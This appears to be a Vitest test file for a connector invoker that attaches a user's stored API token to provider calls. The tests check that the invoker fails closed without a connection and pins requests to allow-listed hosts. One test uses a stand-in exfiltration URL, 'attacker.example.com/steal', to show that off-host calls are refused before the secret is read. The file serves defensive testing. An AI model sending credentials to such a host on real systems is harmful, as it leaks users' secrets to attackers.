/**
 * Connector invoker via the Connections broker (ADR 0037). Proves
 * connectorInvoker.invoke resolves the acting user's provider Connection through
 * the broker + brokered egress, calls the provider with the token, stamps RFC 0079
 * provenance, pins the destination to the provider's apiHosts, and FAILS CLOSED
 * (never a silent no-op, never a throw on a missing connection) when unconfigured.
 *
 * Also covers the capability-honesty surface: discovery advertises
 * `host.connectors` supported only because the slot is wired (no longer
 * throw-on-use), and the agent-pack peer-dependency resolver satisfies it.
 */

import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import http from 'node:http';
import type { AddressInfo } from 'node:net';
import { createApp } from '../src/index.js';
import type { Storage } from '../src/storage/storage.js';
import { createConnectorInvoker, type ConnectorInvokeResult } from '../src/host/connectorInvoker.js';
import { __resetConnectionsStore, createSecretConnection } from '../src/features/connections/connectionsService.js';
import { registerProvider, getProvider } from '../src/features/connections/providerRegistry.js';
import { listHostSurfaces, seedDefaultHostSurfaces } from '../src/bootstrap/hostSurfaceRegistry.js';

describe('Connector invoker (ADR 0037)', () => {
  let api: http.Server;
  let storage: Storage;
  let apiPort: number;
  let received: { method?: string; auth?: string; url?: string; body?: string };
  let nextStatus = 200;
  let nextBody = '{"result":[{"sys_id":"abc"}]}';

  beforeAll(async () => {
    process.env.OPENWOP_STORAGE_DSN = 'memory://';
    process.env.OPENWOP_WEBHOOK_ALLOW_PRIVATE = 'true'; // allow loopback egress in test
    const app = await createApp({ port: 18951, storageDsn: 'memory://', serviceName: 'test', serviceVersion: '0.0.1', enableConsoleTracer: false });
    storage = app.locals.storage;
    await __resetConnectionsStore();

    api = http.createServer((req, res) => {
      let raw = '';
      req.on('data', (c) => (raw += c));
      req.on('end', () => {
        received = { method: req.method, auth: req.headers.authorization, url: req.url, body: raw || undefined };
        res.writeHead(nextStatus, { 'content-type': 'application/json' });
        res.end(nextBody);
      });
    });
    await new Promise<void>((r) => api.listen(0, r));
    apiPort = (api.address() as AddressInfo).port;

    // Register a test provider whose apiHosts pin to the loopback test server.
    // (eTLD+1 boundary `127.0.0.1` — exact match.)
    registerProvider({
      id: 'testconn',
      label: 'Test Connector',
      kind: 'api_key',
      authFlow: 'manual',
      reach: 'openapi',
      scopes: { read: [], write: [] },
      refreshable: false,
      defaultScopes: [],
      consumerNodes: ['core.openwop.http'],
      apiHosts: ['127.0.0.1'],
    });

    await storage.insertRun({ runId: 'run-c', workflowId: 'w', tenantId: 'tc', status: 'pending', inputs: null, metadata: {}, configurable: {}, createdAt: 'x', updatedAt: 'x' });
  });

  afterAll(async () => {
    await new Promise<void>((r) => api.close(() => r()));
  });

  beforeEach(() => {
    nextStatus = 200;
    nextBody = '{"result":[{"sys_id":"abc"}]}';
  });

  const invoker = () => createConnectorInvoker({ storage });
  const ctx = (actingUserId?: string) => ({ tenantId: 'tc', runId: 'run-c', ...(actingUserId ? { actingUserId } : {}) });

  it('resolves the connection, calls through with the token, and stamps provenance', async () => {
    await createSecretConnection({ tenantId: 'tc', provider: 'testconn', kind: 'api_key', secret: 'SECRET-KEY', scope: 'user', userId: 'u1' });
    const out = (await invoker().invoke('testconn', {
      context: ctx('u1'),
      request: { url: `http://127.0.0.1:${apiPort}/api/now/table/incident`, method: 'GET' },
    })) as ConnectorInvokeResult;

    expect(out.ok).toBe(true);
    expect(out.status).toBe(200);
    expect(out.data).toEqual({ result: [{ sys_id: 'abc' }] });
    expect(received.method).toBe('GET');
    expect(received.auth).toBe('Bearer SECRET-KEY');
    const meta = (await storage.getRun('run-c'))?.metadata as Record<string, unknown> | undefined;
    expect((meta?.connectionUse as Array<{ provider?: string }> | undefined)?.some((u) => u.provider === 'testconn')).toBe(true);
  });

  it('passes a body through on a write call', async () => {
    nextStatus = 201;
    nextBody = '{"result":{"sys_id":"new"}}';
    const out = (await invoker().invoke('testconn', {
      context: ctx('u1'),
      request: { url: `http://127.0.0.1:${apiPort}/api/now/table/incident`, method: 'POST', body: '{"short_description":"x"}' },
    })) as ConnectorInvokeResult;
    expect(out.ok).toBe(true);
    expect(out.status).toBe(201);
    expect(received.method).toBe('POST');
    expect(received.body).toBe('{"short_description":"x"}');
  });

  it('FAILS CLOSED (no throw) when the acting user has no Connection', async () => {
    const noUser = (await invoker().invoke('testconn', {
      context: ctx(), // no actingUserId → broker withholds → fail closed
      request: { url: `http://127.0.0.1:${apiPort}/x`, method: 'GET' },
    })) as ConnectorInvokeResult;
    expect(noUser).toEqual({ ok: false, error: 'connector_no_connection' });

    const other = (await invoker().invoke('testconn', {
      context: ctx('u-without-conn'),
      request: { url: `http://127.0.0.1:${apiPort}/x`, method: 'GET' },
    })) as ConnectorInvokeResult;
    expect(other).toEqual({ ok: false, error: 'connector_no_connection' });
  });

  it('pins to the provider apiHosts — an off-host URL fails closed BEFORE touching the secret', async () => {
    const out = (await invoker().invoke('testconn', {
      context: ctx('u1'),
      request: { url: 'https://attacker.example.com/steal', method: 'GET' },
    })) as ConnectorInvokeResult;
    expect(out).toEqual({ ok: false, error: 'connector_host_not_allowed' });
  });

  it('throws a 404 for an unknown connector id', async () => {
    await expect(invoker().invoke('nope-not-a-provider', { context: ctx('u1'), request: { url: 'https://x/y' } })).rejects.toMatchObject({ code: 'not_found', httpStatus: 404 });
  });

  it('rejects malformed args with invalid_request', async () => {
    await expect(invoker().invoke('testconn', { bogus: true })).rejects.toMatchObject({ code: 'invalid_request', httpStatus: 400 });
  });

  it('surfaces a provider HTTP error as ok:false WITHOUT throwing', async () => {
    nextStatus = 403;
    nextBody = '{"error":"forbidden"}';
    const out = (await invoker().invoke('testconn', {
      context: ctx('u1'),
      request: { url: `http://127.0.0.1:${apiPort}/api/now/table/incident`, method: 'GET' },
    })) as ConnectorInvokeResult;
    expect(out.ok).toBe(false);
    expect(out.status).toBe(403);
    expect(out.data).toEqual({ error: 'forbidden' });
  });

  it('advertises host.connectors as supported (capability honesty — the slot is wired)', () => {
    seedDefaultHostSurfaces();
    const surface = listHostSurfaces().find((s) => s.name === 'host.connectors');
    expect(surface?.supported).toBe(true);
  });

  it('servicenow now carries apiHosts (deploy-gated egress is allow-listed)', () => {
    expect(getProvider('servicenow')?.apiHosts).toEqual(['service-now.com']);
  });
});
